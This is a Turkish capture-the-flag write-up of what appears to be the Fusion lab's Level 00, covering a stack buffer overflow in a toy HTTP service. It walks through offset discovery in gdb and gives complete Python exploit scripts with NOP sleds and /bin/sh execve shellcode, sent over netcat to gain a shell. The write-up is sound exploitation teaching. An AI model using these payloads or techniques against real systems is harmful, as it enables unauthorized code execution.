# `Level 00 Writeup`

![source code](img/level00/level00_source-code.png)

![about](img/level00/level00_about.png)

Isınmak için basit bir alıştırma ve dönüş adresi üzerine bir bellek adresi yazabiliriz. Ayrıca ipucu olarakda fix_path fonksiyonunda bulunan realpath'den dolayı bazı kısıtlamalar olabileceğini bu yüzden HTTP/1.1 ' den sonraya yazabileceğimizi söylemiş. Peki tam olarak ne demek istemiş hadi öğrenelim :)

![0](img/level00/level00_0.png)

Programımız `20000` numaralı portta çalışıyor ve PID değeri de `1476` .

Şimdi ana bilgisayarımızdan fusion makinesinin `20000` portuna bağlanmaya çalışalım bakalım ne olacak.

![1](img/level00/level00_1.png)

İlk başta bağlantı talebimizi gönderdikten sonra düz bir string girdik ve bize bunun bir `GET` isteği olmadığını söyledi. Daha sonra bizden istediği `GET` isteğini gönderdiğimizde ise girmiş olduğumuz stringe erişmeye çalıştığını görüyoruz. Demek ki `GET` isteği ile `HTTP/1.1` arasında yazdığımız değeri bir yerde saklıyor. ( printf("trying to access %s\n"), path; )

Bir input alanı bulduğumuza göre belleği taşırma çalışmalarına başlayabiliriz :))

    python -c "print('GET ' +  'A'*128 + ' HTTP/1.1')" | nc 192.168.56.4 20000

**

Tabi bu şekilde istekler göndererek nerede crash olduğunu veya `eip` üzerine yazdığını tam olarak anlayamıyoruz. Bu yüzden isteğimizi göndermeden önce sanal makinemizde `gdb` ile programımızı çalışan `pid` numarasını vererek açacağız.

Makinemizde gdb yazıp debuggerımızı açtıktan sonra `ps aux` komutu ile öğrendiğimiz PID değerini `attach pid` komutunda yerine koyarak çalışan bir uygulamayı debug edebiliyoruz. Eğer bu tarzda bizden bir değer bekliyorsa `c (continue)` komutunu girerek değer geldikten sonraki değişimi görebiliriz.

`Örnek : `

![2](img/level00/level00_2.png)

Şimdi ana makinemizden istek göndererek offset değerini bulabiliriz.

![3](img/level00/level00_3.png)

Hızlıca deneme yanılma yoluyla offset'in 139 olduğunu buldum.

`NOT :` Her istek yapmadan önce tekrardan gdb üzerinde attach komutu ile programımıza bağlanıp `c` komutu ile isteğin gelmesini beklememiz gerekmektedir. Bu yüzden offset'i bulma konusunda daha hızlı çözümler kullanabilirsiniz. (pattern_create & pattern_offset)

![4](img/level00/level00_4.png)

Offsetimizi bulduk artık dönüş adresinin (eip) üzerine stack adresi yazarak (esp) shellcode'umuzu yükleyip çalıştırabiliriz. Burada dikkat etmemiz gereken şey ise en başta vermiş olduğu ipucunu dikkate alarak adresimizi `HTTP/1.1` ' den sonra göndermemiz gerektiğidir.

Öncelikle `esp` adresini bulalım

![5](img/level00/level00_5.png)

Şimdi exploitimizi oluşturmaya başlayabiliriz...

```python
    import struct

    payload = 'GET ' # need GET request
    payload += 'A'*139 # offset
    payload += struct.pack("<I", 0xbffff8e0)  # esp
    payload += ' HTTP/1.1'
    payload += '\x90'*100 # nop
    payload += '\xCC'*4 # trap

    print payload
```

    python2 level00.py | nc 192.168.56.6 20000

![6](img/level00/level00_6.png)

Tuzağımız çalışmadı ve bize `SIGILL, Illegal instruction` hatası verdi. Demekki `eip` üzerine yazdığımı `esp` adresi stack içerisinde tam olarak istediğimiz yere denk gelmiyor. O zaman adresimizi bulmak için tekrardan aşağıdaki şekilde istek gönderelim

    python2 -c "print('GET ' +  'A'*139 + 'BBBB' + ' HTTP/1.1' + 'C'*100)" | nc 192.168.56.6 20000

**

Bu şekilde isteğimizi gönderdiğimize göre şimdi stack içerisinde `C` karakterlei tam olarak nerden başlıyor onu bulalım. (Peda komutları nedense bir türlü çalışmıyor. GitHub reposunda aynı sorunu yaşayanlar issue açmışlar ancak herhangi bir çözüm belirtilmemiş)

![7](img/level00/level00_7.png)

Aradığımız adresin `0xbffff994` olduğunu böylelikle öğrenmiş olduk. Şimdi exploitimizi güncelleyip tekrardan deniyelim.

```python
    import struct

    payload = 'GET ' # need GET request
    payload += 'A'*139 # offset
    payload += struct.pack("<I", 0xbffff994) # stack
    payload += ' HTTP/1.1'
    payload += '\x90'*100 # nop
    payload += '\xCC'*4 # trap

    print payload
```

    python2 level00.py | nc 192.168.56.6 20000

![8](img/level00/level00_8.png)

Ve istediğimiz gibi `SIGTRAP` hatasını aldık. Artık `shellcode` ' umuzu ayarlayıp exploitimizi son aşamaya getirebiliriz.

```python

import struct

# http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = ""
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"

payload = 'GET ' # need GET request
payload += 'A'*139 # offset
payload += struct.pack("<I", 0xbffff994)  # stack
payload += ' HTTP/1.1'
payload += shellcode

print payload

```

    (python2 level00.py ; cat) | nc 192.168.56.6 20000

![9](img/level00/level00_9.png)
